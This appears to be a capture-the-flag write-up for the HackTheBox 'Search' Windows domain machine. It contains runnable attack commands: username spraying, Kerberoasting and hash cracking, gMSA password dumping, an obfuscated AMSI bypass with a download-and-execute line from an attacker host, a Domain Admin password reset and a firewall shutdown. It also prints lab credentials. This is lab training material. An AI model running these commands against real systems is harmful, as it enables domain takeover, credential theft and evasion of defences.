---
description: https://app.hackthebox.com/machines/Search
cover: ../../../.gitbook/assets/Search.png
coverY: -58.03108808290142
---

# Search

## Nmap

```
sudo nmap 10.10.11.129 -p- -sS -sV

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-05 18:32:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Kerbrute

Starting out we hit some valid usernames whe running kerbrute against the target system. I was unable to proceed with the found usernames so we move onto enumerating the web server.

```
kerbrute userenum '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' --dc 10.10.11.129 --domain search.htb   
```

![](<../../../.gitbook/assets/image (787).png>)

Basic reconnaissance against the web server shows some team members who may have valid accounts within Active Directory.

![](<../../../.gitbook/assets/image (738).png>)

The potential users have been listed below.

```
Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
```

As we are not aware of the naming convention used for Active Directory user accounts we need to generate a list of possible combinations.

### Username Generation

Username generation can be completed with usernamer. usernamer will take an input list of usernames and generate combinations based on likely naming convetions

**URL:** [https://github.com/jseidl/usernamer](https://github.com/jseidl/usernamer)

```
python2 usernamer.py -f usernames -l >> usernames_AD.txt
```

After generating the usernames we can the new list with kerbrute against. Revealing the naming convention of _Firstname.Surname_.

```
kerbrute userenum ~/Desktop/usernames_AD.txt --dc '10.10.11.129' --domain 'search.htb'
```

![](<../../../.gitbook/assets/image (662).png>)

However, after multiple brute force attempts I was unable to proceed.

### Information within images

After some time we head back over to the web server and after some time, we find one of the displayed images contains credential information for a internal user.

![](<../../../.gitbook/assets/image (596).png>)

Keywords identified are "Hope Sharp" and "IsolationIsKey?". Considering we know the naming context for this Domain we try the potential credentials with `crackmapexec`.

```
crackmapexec smb '10.10.11.129' -u hope.sharp -p 'IsolationIsKey?' -d 'search.htb'
```

![](<../../../.gitbook/assets/image (806).png>)

### Service Prinicipal Names

With valid credentials we check for SPN's using Impacket `GetUserSPNs.py` and pull a krb5tgs hash for the user _web\_svc_.

```
GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -dc-ip '10.10.11.129' -request
```

![](<../../../.gitbook/assets/image (633).png>)

Using hashcat on mode 13100 we are able to soon crack the hash with the `rockyou.txt` wordlist.

```
hashcat -a 0 -m 13100 hash.hash /usr/share/wordlists/rockyou.txt 
```

![](<../../../.gitbook/assets/image (808).png>)

Credentials:`web_svc:@3ONEmillionbaby`

### Password Spraying

I tested for some timed with the web\_svc account and was unable to progress anywhere meaningful. Spraying the password against all known uses (who have been enumerated with valid credentials) we get a hit for _edgar.jacobs_.

```
crackmapexec smb '10.10.11.129' -u ~/Desktop/users -p '@3ONEmillionbaby' --continue-on-success
```

![](<../../../.gitbook/assets/image (653).png>)

Credentials: `edgar.jacobs:@3ONEmillionbaby`

### Protected Worksheets

Using these credentials against SMB with smbmap we recursively lists all available shares.

```
smbmap -H '10.10.11.129' -u 'edgar.jacobs' -p '@3ONEmillionbaby' -d 'search.htb' -R
```

Where under Edgar's Desktop redirected folders we see "Phishing\_Attempt.xlsx".

![](<../../../.gitbook/assets/image (49) (2).png>)

Using smbmap we download the file of interest.

```
smbmap -H '10.10.11.129' -u 'edgar.jacobs' -p '@3ONEmillionbaby' -d 'search.htb' -R -A xlsx
```

![](<../../../.gitbook/assets/image (751).png>)

Opening the Phishing\_attempt.xlsx file we see under the worksheet "passwords" that column "C" is missing. As well as the worksheet being password protected.

![](<../../../.gitbook/assets/2022-07-14 12\_24\_34-10.10.11.129-RedirectedFolders\_edgar.jacobs\_Desktop\_Phishing\_Attempt.xlsx - Exce.png>)

Some research shows there is various ways of removing the worksheet protection when the password is not known:

``[`https://www.ablebits.com/office-addins-blog/protect-unprotect-excel-sheet-password/#unlock-excel-spreadsheet-vba`](https://www.ablebits.com/office-addins-blog/protect-unprotect-excel-sheet-password/#unlock-excel-spreadsheet-vba)``

I opted for the copy and paste method where you highlight all cells and simply paste into a net worksheet. Revealing passwords as shown below.

![](<../../../.gitbook/assets/2022-07-14 12\_26\_02-10.10.11.129-RedirectedFolders\_edgar.jacobs\_Desktop\_Phishing\_Attempt.xlsx - Exce.png>)

### Password Spraying #2

Spraying the password list against the list of known users we get a hit for Sierra.Frye.

![](<../../../.gitbook/assets/image (640).png>)

Credentials:

```
sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18
```

### Bloodhound

With valid credentials we can perform BloodHound enumeration externally with Bloodhound.py

**GitHub:** [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

```
python3 bloodhound.py -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns '10.10.11.129' -d 'search.htb'
```

After completing the BloodHound enumeration the results are uploaded to the console and reviewed. We see we are a member of the "Remote Management Users".

![](<../../../.gitbook/assets/image (658).png>)

No luck, WinRM is not running externally on the target system.

### GMSAPassword

![](<../../../.gitbook/assets/image (599).png>)

Further enumeration shows effective members of the group _ITSEC_ have the ability to read the GMSA password of _BIR-ADFS-GMSA_.

gMSADUmper is a python script that can be utilized to read the msDS-ManagedPassword \*\*\*\* attribute and decrypt with the **msDS-ManagedPasswordID** attribute.

**gMSADumper:** [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```
python3 gMSADumper.py -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb -l 10.10.11.129
```

![](<../../../.gitbook/assets/image (828).png>)

After successfully reading and decrypting the GMSA password we are left with the following credentials: `BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f`

However, from here I was unable to proceed with the credentials.

### Certificates

Going back to further enumeration we use `smbmap` to list available shares using Sierra's credentials and find some certificate files within the redirected folders share.

```
smbmap -H '10.10.11.129' -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -d 'search.htb' -R -A "p12"
smbmap -H '10.10.11.129' -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -d 'search.htb' -R -A "pfx" 
```

![](<../../../.gitbook/assets/image (677).png>)

After downloading we are prompted for a password on the `.pfx` file.

![](<../../../.gitbook/assets/image (679).png>)

`pfx2john` is used to convert the file to a hash usable by `john`.

```
/usr/bin/pfx2john ~/10.10.11.129-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx >> pfxhash.hash
```

Cracking the hash:

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt pfxhash.hash 
```

![](<../../../.gitbook/assets/image (595).png>)

We can now import the certificate file into Firefox. A password will be prompted to complete the action where we provide the same password shown above.

### PowerShell Web Access

Moving over to the `/staff` web page we are given the opportunity to provide the certificate file.

![](<../../../.gitbook/assets/image (795).png>)

We are then progressed a PowerShell web access console. Logging in with Sierra's credentials and the computer name as "research" allows logon.

![](<../../../.gitbook/assets/image (692).png>)

![](<../../../.gitbook/assets/image (698).png>)

### User.txt

We are then able to grab the `user.txt` flag.

![](<../../../.gitbook/assets/image (846).png>)

### Lateral Movement with PowerShell

I was unable to find a method of privilege escalation as Sierra and BloodHound was not providing any paths for potential escalation.

I decided to proceed with gaining command execution as _BIR-ADFS-GMSA$_ using PowerShell remoting.

Even though we already have the credentials for `BIR-ADFS-GMSA$` I used the following PowerShell snippet linked below to build a credential variable from the GMSA read ability for use with `Invoke-Command`.

**URL:** [https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)

```
$cred = new-object system.management.automation.PSCredential "search.htb\BIR-ADFS-GMSA",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
Invoke-Command -ComputerName $env:computername -Credential $cred -ScriptBlock {whoami}
```

![](<../../../.gitbook/assets/image (669).png>)

### Invoke-ACLScanner

Whilst working as BIR-ADFS-GMSA$ I then bypassed AMSI and run Powerview's Invoke-ACL Scanner to look for ACL's of interest.

```
Invoke-Command -computername research -Credential $cred -ScriptBlock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ); iex (iwr -usebasicparsing http://10.10.14.8:8000/powerview.ps1);Invoke-ACLScanner -ResolveGUIDs | out-file c:\redirectedfolders\Output.txt }
```

![](<../../../.gitbook/assets/image (722).png>)

Looking through the results we see that `BIR-ADFS-GMSA$` has GenericAll privileges over the user Tristan.Davies wo is a Domain Administrator. Weird how this attack path was not picked up by BloodHound.

![](<../../../.gitbook/assets/image (827).png>)

As we have GenericAll over Tristan.Davies we can change the user's password.

```
Invoke-Command -computername research -Credential $cred -ScriptBlock {net user /domain tristan.davies Password123}
```

![](<../../../.gitbook/assets/image (730).png>)

To gain full shell access I disabled the firewall with our now acquired Domain Administrator account.

```
crackmapexec smb '10.10.11.129' -u 'Tristan.Davies' -p 'Password123' -d 'search.htb'  -x 'netsh advfirewall set allprofiles state off'
```

Check the WSMAN is running with `Nmap`.

![](<../../../.gitbook/assets/image (644).png>)

### root.txt

Then proceeded to login with `Evil-WinRM`.

```
evil-winrm -i '10.10.11.129' -u 'Tristan.Davies' -p 'Password123'
```

Then grabbed the `root.txt` flag.

![](<../../../.gitbook/assets/image (676).png>)
